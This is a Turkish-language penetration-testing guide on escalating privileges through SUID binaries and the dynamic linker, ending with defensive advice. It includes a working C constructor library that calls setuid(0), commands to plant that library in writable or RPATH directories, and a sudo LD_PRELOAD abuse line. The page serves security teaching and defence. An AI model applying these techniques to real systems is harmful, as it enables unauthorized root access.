# SUID Shared Library ve Linker Abuse

{{#include ../../banners/hacktricks-training.md}}

SUID binary'leri genellikle doğrudan command execution açısından incelenir, ancak özel SUID programları dynamic linker üzerinden de savunmasız olabilir. Ortak tema basittir: ayrıcalıklı bir executable, daha düşük ayrıcalıklara sahip bir kullanıcının etkileyebildiği bir path veya configuration üzerinden code yükler.

Bu sayfa generic technique pattern'lerine odaklanır: eksik library'ler, yazılabilir library directory'leri, `RPATH`/`RUNPATH`, sudo üzerinden `LD_PRELOAD`, linker configuration ve SUID hardlink confusion.

## Fast Enumeration

Olağandışı SUID dosyalarını bularak ve bunların dynamically linked olup olmadığını kontrol ederek başlayın:
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Standart olmayan konumlara, özel uygulama yollarına, root tarafından sahip olunan ancak paket yöneticisi tarafından yönetilen dizinlerin dışındaki binary'lere ve yazılabilir dizinlerden yüklenen bağımlılıklara odaklanın.

Yararlı yazılabilirlik kontrolleri:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Eksik Shared Object Injection

Bazı özel SUID binary'leri mevcut olmayan bir shared object yüklemeye çalışır. Eksik path attacker tarafından kontrol edilen bir dizinin altındaysa binary, attacker tarafından sağlanan code'u effective user olarak yükleyebilir.

Başarısız library aramalarını bulun:
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
Binary, `libexample.so` için yazılabilir bir yolda arama yapıyorsa, minimal bir etki kanıtı kütüphanesi bir constructor kullanabilir. Doğrulama sırasında etki kanıtını zararsız tutun:
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
İkili dosyanın yüklemeye çalıştığı tam dosya adıyla oluşturun:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
İstismar edilebilir koşul yalnızca eksik Library değildir. Saldırgan, ayrıcalıklı loader'ın kabul edeceği bir path'e uyumlu bir shared object yerleştirebilmelidir.

## Yazılabilir Library Directory

Bazen tüm bağımlılıklar mevcuttur, ancak bunları çözümlemek için kullanılan directory'lerden biri yazılabilirdir. Bu durum, yüklenen bir Library'nin değiştirilmesine veya aynı ada sahip, daha yüksek öncelikli bir Library'nin yerleştirilmesine olanak tanıyabilir.

Bağımlılık path'lerini inceleyin:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Dizin yazılabilir durumdaysa, bir lab ortamında kopya üzerinde güvenli bir yaklaşımla doğrulayın. Canlı bir host üzerindeki system libraries dosyalarını değiştirmek authentication, package management veya boot-critical services işlemlerini bozabilir.

## RPATH ve RUNPATH

`RPATH` ve `RUNPATH`, loader'a libraries için nerelerde arama yapacağını bildiren dynamic-section girdileridir. Attacker tarafından yazılabilir dizinleri gösterdiklerinde SUID programlarında tehlikelidirler.

Bunları tespit edin:
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Riskli çıktı örneği:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
`/opt/app/lib` yazılabilir durumdaysa ve binary `libcustom.so` gerektiriyorsa saldırgan buraya kötü amaçlı bir `libcustom.so` yerleştirebilir:
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` ve `RUNPATH` tüm çözümleme ayrıntılarında aynı değildir; ancak privilege-escalation incelemesi açısından pratik soru aynıdır: SUID binary bir library name için attacker-writable bir directory arıyor mu?

## LD_PRELOAD, LD_LIBRARY_PATH ve SUID

Normal programlarda `LD_PRELOAD` ve `LD_LIBRARY_PATH`, shared object loading işlemini zorlayabilir veya etkileyebilir. SUID programlarda dynamic loader normalde secure-execution mode'a geçer ve tehlikeli environment variable'ları yok sayar.

Bu, kullanıcının `LD_PRELOAD` ayarlayabilmesi nedeniyle sıradan bir SUID binary'nin genellikle vulnerable olmadığı anlamına gelir:
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
Yaygın istisna sudo yanlış yapılandırmasıdır. `sudo -l`, `LD_PRELOAD` veya `LD_LIBRARY_PATH` gibi bir değişkenin korunduğunu gösteriyorsa sudo tarafından çalıştırılmasına izin verilen bir komut, saldırganın kontrol ettiği kodu yükleyebilir:
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Bu durumları birbirine karıştırmayın:

- Normal bir SUID binary üzerinde `LD_PRELOAD`: genellikle secure execution tarafından engellenir.
- sudo tarafından korunan `LD_PRELOAD`: potansiyel olarak exploitable.
- Writable bir path içindeki eksik `.so`: SUID binary bu path'i doğal olarak yüklediğinde exploitable.
- Writable bir directory'ye işaret eden `RPATH`/`RUNPATH`: gerekli bir library kontrol edilebildiğinde exploitable.
- `/etc/ld.so.preload` veya linker config write access: system-wide ve high impact.

## Linker Configuration

Dynamic linker ayrıca `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, linker cache ve bazı durumlarda `/etc/ld.so.preload` gibi system configuration'ları da okur.

Yüksek değerli kontroller:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Yazılabilir linker yapılandırması genellikle tek bir güvenlik açığı bulunan SUID binary'den daha ciddidir; çünkü dinamik olarak linklenen birçok process'i etkileyebilir. `/etc/ld.so.preload` özellikle tehlikelidir, çünkü privileged process'lere bir shared object'i zorla yükleyebilir.

## SUID Hardlink Confusion

Hardlink'ler, aynı SUID inode'un birden fazla isim altında görünmesini sağlayabilir. Bu, privileged bir helper'ı gizlemek, cleanup işlemlerini karıştırmak veya naif path tabanlı incelemeleri atlatmak için kullanışlıdır.

Birden fazla link'e sahip SUID dosyalarını bulun:
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Aynı inode'a giden tüm yolları inceleyin:
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
Kötüye kullanım, bir hardlink'in izinleri değiştirmesi değildir. Kötüye kullanım, path confusion'dır: ayrıcalıklı bir inode, savunmacıların veya script'lerin beklemediği bir ad üzerinden erişilebilir olabilir. Daha ayrıntılı inode ve hardlink iş akışı için [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md) bölümüne bakın.

## Defensive Notes

- SUID binary'lerini mümkün olduğunca minimal, denetlenmiş ve package-managed tutun.
- Yazılabilir veya application-managed dizinleri gösteren `RPATH`/`RUNPATH` girdilerinden kaçının.
- Library dizinlerinin root-owned olmasını ve normal kullanıcılar tarafından yazılamamasını sağlayın.
- `LD_PRELOAD`, `LD_LIBRARY_PATH` veya benzer loader değişkenlerini sudo üzerinden korumayın.
- `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` ve beklenmeyen SUID dosyalarını izleyin.
- Hardlink'lenmiş SUID dosyalarını inceleyin ve standart system path'lerinin dışındaki özel SUID wrapper'larını araştırın.

{{#include ../../banners/hacktricks-training.md}}
